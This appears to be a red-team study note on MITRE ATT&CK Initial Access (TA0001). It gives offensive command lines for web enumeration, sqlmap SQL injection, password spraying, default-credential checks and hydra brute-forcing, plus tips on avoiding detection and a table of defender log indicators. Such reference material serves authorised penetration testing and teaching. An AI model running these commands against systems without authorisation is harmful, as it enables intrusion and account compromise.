---
type: tactic-hub
room: red
tactic: "Initial Access"
tactic_id: "TA0001"
tags: [red/initial-access, mitre/TA0001]
date_updated: {{date}}
---

# TA0001 — Initial Access

> [!quote]
> *"The game is afoot."*
> — *The Adventure of the Abbey Grange*

**MITRE Reference:** [TA0001](https://attack.mitre.org/tactics/TA0001/) | **Kill Chain Phase:** Delivery / Exploitation

The adversary is trying to get into the network. This is the moment Holmes breaks through the locked door — every technique here represents a different key. Initial access transforms intelligence gathered during [[TA0043 - Reconnaissance]] into a foothold inside the target.

---

## Techniques in This Tactic

| Technique ID | Name | Prevalence |
|-------------|------|-----------|
| [[T1190 - Exploit Public-Facing Application]] | Exploit Public-Facing Application | ⭐⭐⭐⭐⭐ |
| [[T1133 - External Remote Services]] | External Remote Services | ⭐⭐⭐⭐ |
| [[T1566 - Phishing]] | Phishing | ⭐⭐⭐⭐⭐ |
| [[T1189 - Drive-by Compromise]] | Drive-by Compromise | ⭐⭐⭐ |
| [[T1091 - Replication Through Removable Media]] | Replication Through Removable Media | ⭐⭐ |
| [[T1195 - Supply Chain Compromise]] | Supply Chain Compromise | ⭐⭐ |
| [[T1199 - Trusted Relationship]] | Trusted Relationship | ⭐⭐⭐ |
| [[T1078 - Valid Accounts]] | Valid Accounts | ⭐⭐⭐⭐⭐ |

---

## The Standard Kit *(Tools)*

| Tool | Role | Command Stub |
|------|------|-------------|
| `searchsploit` | Exploit DB search | `searchsploit <service> <version>` |
| `metasploit` | Exploit framework | `msfconsole` |
| `sqlmap` | SQLi exploitation | `sqlmap -u <url> --dbs` |
| `hydra` | Credential brute-force | `hydra -l <user> -P <wordlist> <target> <protocol>` |
| `crackmapexec` / `netexec` | SMB/credential spray | `nxc smb <target> -u users.txt -p passwords.txt` |
| `evilginx` | Phishing proxy (MFA bypass) | — |
| `gophish` | Phishing campaign framework | — |
| `nuclei` | Vulnerability scanner | `nuclei -u <url> -t cves/` |

---

## Standard Initial Access Workflows

### Path A — Web Application Exploitation

```bash
# Enumerate the application
gobuster dir -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster.txt
ffuf -u <url>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302

# Version fingerprinting → searchsploit
whatweb <url>
searchsploit <cms_name> <version>

# SQLi quick check
sqlmap -u "<url>?id=1" --batch --dbs
sqlmap -u "<url>" --data="user=x&pass=y" --batch --dbs

# Nuclei CVE scan
nuclei -u <url> -t cves/ -severity critical,high -o nuclei-results.txt
```

### Path B — Credential Attack (External Services)

```bash
# Identify exposed services from recon
nxc smb <target-range> --gen-relay-list relay-targets.txt

# Password spray (mind lockout policy — default: 1 attempt per 30 min)
nxc smb <target> -u users.txt -p 'Password123!' --continue-on-success
nxc ssh <target> -u users.txt -p passwords.txt

# RDP brute (use sparingly — very noisy)
hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt rdp://<target>
```

### Path C — Default Credentials Check

```bash
# Common services
nxc smb <target> -u 'administrator' -p 'administrator'
nxc winrm <target> -u 'administrator' -p 'Password1'

# Web panels — try admin:admin, admin:password, admin:1234
curl -s -o /dev/null -w "%{http_code}" -u admin:admin http://<target>/admin
```

---

## OPSEC Considerations

> [!warning] Don't Burn the Foothold
> - **Credential sprays**: confirm lockout threshold before any brute-force. One account locked = alert triggered.
> - **Nuclei / scanners**: extremely noisy; run only when stealth is not required.
> - **SQLi**: `--level 5 --risk 3` will fire thousands of requests — default `--batch` is safer.
> - **Phishing**: test links in sandboxed browser before sending; URL scanners will pre-detonate.

---

## What Blue Sees

| Activity | Log Source | Indicator |
|----------|-----------|-----------|
| Exploit attempt | WAF / Web logs | 4xx/5xx bursts, known exploit signatures |
| Credential spray | AD / Auth logs | Multiple 4625 events from single source |
| SQLi | App / WAF logs | Unusual query parameters, `sleep()`, `UNION` |
| Successful initial access | Auth logs | 4624 (Logon) from unexpected source |

---

## Related Notes

- [[TA0043 - Reconnaissance]] ← Feeds into this
- [[TA0002 - Execution]] ← What happens after
- [[T1190 - Exploit Public-Facing Application]]
- [[Red - Instruments]]

↩ [[Red - Notes]] · [[Red]] · [[Mind Palace]]
